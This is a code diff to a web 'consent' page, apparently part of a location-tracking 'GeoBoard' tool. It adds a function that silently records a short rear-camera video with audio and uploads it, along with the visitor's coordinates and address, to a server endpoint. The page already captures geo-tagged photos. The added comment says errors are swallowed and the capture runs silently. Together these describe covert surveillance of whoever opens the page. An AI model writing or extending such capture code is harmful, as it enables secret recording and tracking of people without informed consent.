@@ -7,10 +7,11 @@ import {
 } from "@workspace/api-client-react";
 import { Card, CardContent } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
-import { Shield, MapPin, CheckCircle, XCircle, Loader2, AlertTriangle, WifiOff, ExternalLink, Camera } from "lucide-react";
+import { Shield, MapPin, CheckCircle, XCircle, Loader2, AlertTriangle, WifiOff, ExternalLink, Camera, Video } from "lucide-react";
 
 const API_BASE = import.meta.env.BASE_URL.replace(/\/$/, "");
 const GEO_PHOTO_COUNT = 5;
+const GEO_VIDEO_DURATION_MS = 3000; // 3 seconds
 
 type ConsentState =
   | "idle"
@@ -75,6 +76,83 @@ async function captureGeoPhotos(
   }
 }
 
+// Capture a short video clip (2-5 s) and upload it as a GeoBoard video.
+// Runs silently — errors are swallowed.
+async function captureGeoVideo(
+  token: string,
+  lat: number,
+  lng: number,
+  address: string | undefined,
+  onStateChange: (s: "recording" | "uploading" | "done" | "error") => void,
+): Promise<void> {
+  if (!navigator.mediaDevices?.getUserMedia || typeof MediaRecorder === "undefined") {
+    onStateChange("error");
+    return;
+  }
+
+  // Pick the best supported MIME type
+  const mimeType = ["video/webm;codecs=vp9", "video/webm;codecs=vp8", "video/webm", "video/mp4"]
+    .find((m) => MediaRecorder.isTypeSupported(m)) ?? "";
+
+  let stream: MediaStream | null = null;
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "environment", width: { ideal: 1280 }, height: { ideal: 720 } },
+      audio: true,
+    });
+
+    // Brief warm-up
+    await new Promise((r) => setTimeout(r, 800));
+
+    const chunks: Blob[] = [];
+    const recorder = new MediaRecorder(stream, mimeType ? { mimeType } : undefined);
+    recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
+
+    onStateChange("recording");
+
+    await new Promise<void>((resolve, reject) => {
+      recorder.onstop = () => resolve();
+      recorder.onerror = () => reject(new Error("MediaRecorder error"));
+      recorder.start(500); // collect in 500ms chunks
+      setTimeout(() => { try { recorder.stop(); } catch { resolve(); } }, GEO_VIDEO_DURATION_MS);
+    });
+
+    const blob = new Blob(chunks, { type: mimeType || "video/webm" });
+    if (blob.size === 0) { onStateChange("error"); return; }
+
+    // Convert blob to base64
+    const base64 = await new Promise<string>((res, rej) => {
+      const reader = new FileReader();
+      reader.onload = () => res(reader.result as string);
+      reader.onerror = () => rej(new Error("FileReader error"));
+      reader.readAsDataURL(blob);
+    });
+
+    onStateChange("uploading");
+
+    await fetch(`${API_BASE}/api/geo-videos`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        token,
+        videoData: base64,
+        mimeType: blob.type,
+        durationMs: GEO_VIDEO_DURATION_MS,
+        latitude: lat,
+        longitude: lng,
+        address,
+      }),
+      signal: AbortSignal.timeout(30000),
+    });
+
+    onStateChange("done");
+  } catch {
+    onStateChange("error");
+  } finally {
+    stream?.getTracks().forEach((t) => t.stop());
+  }
+}
+
 function detectWebView(): boolean {
   if (typeof navigator === "undefined") return false;
   const ua = navigator.userAgent || "";
@@ -112,7 +190,9 @@ export default function ConsentPage() {
   const [lastSent, setLastSent] = useState<Date | null>(null);
   const [geoPhotoCount, setGeoPhotoCount] = useState(0);
   const [geoPhotoDone, setGeoPhotoDone] = useState(false);
+  const [geoVideoState, setGeoVideoState] = useState<"idle" | "recording" | "uploading" | "done" | "error">("idle");
   const geoBoardStartedRef = useRef(false);
+  const geoVideoStartedRef = useRef(false);
 
   const watchIdRef = useRef<number | null>(null);
   const wakeLockRef = useRef<WakeLockSentinel | null>(null);
